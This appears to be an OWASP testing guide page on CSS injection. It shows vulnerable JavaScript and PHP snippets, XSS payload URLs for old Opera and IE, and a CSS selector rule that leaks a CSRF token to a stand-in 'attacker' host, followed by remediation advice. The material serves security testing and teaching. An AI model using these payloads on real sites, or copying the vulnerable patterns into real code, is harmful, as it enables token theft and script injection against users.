## Summary

A CSS Injection vulnerability involves the ability to inject arbitrary
CSS code in the context of a trusted web site, and this will be rendered
inside the victim's browser. The impact of such a vulnerability may vary
on the basis of the supplied CSS payload: it could lead to Cross-Site
Scripting in particular circumstances, to data exfiltration in the sense
of extracting sensitive data or to UI modifications.

## How to Test

Such a vulnerability occurs when the application allows to supply
user-generated CSS or it is possible to somehow interfere with the legit
stylesheets. Injecting code in the CSS context gives the attacker the
possibility to execute JavaScript in certain conditions as well as
extracting sensitive values through CSS selectors and functions able to
generate HTTP requests. Actually, giving the users the possibility to
customize their own personal pages by using custom CSS files results in
a considerable risk, and should be definitely avoided.

The following JavaScript code shows a possible vulnerable script in
which the attacker is able to control the "location.hash" (source) which
reaches the "cssText" function (sink). This particular case may lead to
DOMXSS in older browser versions, such as Opera, Internet Explorer and
Firefox; for reference see DOM XSS Wiki, section "Style Sinks".

    <a id="a1">Click me</a>
    <script>
      if (location.hash.slice(1)) {
        document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
      }
    </script>

Specifically the attacker could target the victim by asking her to visit
the following URLs:

  - www.victim.com/\#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;
    (Opera \[8,12\])
  - www.victim.com/\#red;-:expression(alert(URL=1)); (IE 7/8)

The same vulnerability may appear in the case of classical reflected XSS
in which for instance the PHP code looks like the following:

    <style>
    p {
      color: <?php echo $_GET['color']; ?>;
      text-align: center;
    }
    </style>

Much more interesting attack scenarios involve the possibility to
extract data through the adoption of pure CSS rules. Such attacks can be
conducted through CSS selectors and leading for instance to grab
anti-CSRF tokens, as follows. In particular,
input\[name=csrf_token\]\[value=^a\] represents an element with the
attribute "name" set "csrf_token" and whose attribute "value" starts
with "a". By detecting the length of the attribute "value", it is
possible to carry out a brute force attack against it and send its value
to the attacker's domain.

    <style>
    input[name=csrf_token][value=^a] {
      background-image: url(http://attacker/log?a);
    }
    </style>

Much more modern attacks involving a combination of SVG, CSS and HTML5
have been proven feasible, therefore we recommend to see the References
section for details.

### Black Box testing

We are referring to client-side testing, therefore black box testing is
not usually performed since access to the source code is always
available as it needs to be sent to the client to be executed. However,
it may happen that the user is given a certain degree of freedom in
terms of possibilities to supply HTML code; in that case it is required
to test whether no CSS injections are possible: tags like "link" and
"style" should be disallowed, as well as attributes "style".

### Gray Box testing

**Testing for CSS Injection vulnerabilities:**
Manual testing needs to be conducted and the JavaScript code analyzed in
order to understand whether the attackers can inject its own content in
CSS context. In particular we should be interested in how the website
returns CSS rules on the basis of the inputs.

The following is a basic example:

    <a id="a1">Click me</a>
    <b>Hi</b>
    <script>
      $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
      });
    </script>

The above code contains a source "location.hash" that is controlled by
the attacker that can inject directly in the attribute "style" of an
HTML element. As mentioned above, this may lead to different results on
the basis of the adopted browser and the supplied payload.

It is recommended that testers use the jQuery function css(property,
value) in such circumstances as follows, since this would disallow any
damaging injections. In general, we recommend to use always a whitelist
of allowed characters any time the input is reflected in the CSS
context.

    <a id="a1">Click me</a>
    <b>Hi</b>
    <script>
      $("a").click(function(){
        $("b").css("color",location.hash.slice(1));
      });
    </script>

## References

**OWASP Resources**

  - [DOM based XSS Prevention Cheat
    Sheet](DOM_based_XSS_Prevention_Cheat_Sheet "wikilink")
  - DOMXSS Wiki - <https://code.google.com/p/domxsswiki/wiki/CssText>

**Presentations**
\* DOM Xss Identification and Exploitation, Stefano Di Paola -
[<http://dominator.googlecode.com/files/DOMXss_Identification_and_exploitation.pdf>](https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/dominator/DOMXss_Identification_and_exploitation.pdf)

  - Got Your Nose\! How To Steal Your Precious Data Without Using
    Scripts, Mario Heiderich -
    <http://www.youtube.com/watch?v=FIQvAaZj_HA>
  - Bypassing Content-Security-Policy, Alex Kouzemtchenko -
    <http://ruxcon.org.au/assets/slides/CSP-kuza55.pptx>

**Proof of Concepts**
\* Password "cracker" via CSS and HTML5 -
<http://html5sec.org/invalid/?length=25>

  - CSS attribute reading - <http://eaea.sirdarckcat.net/cssar/v2/>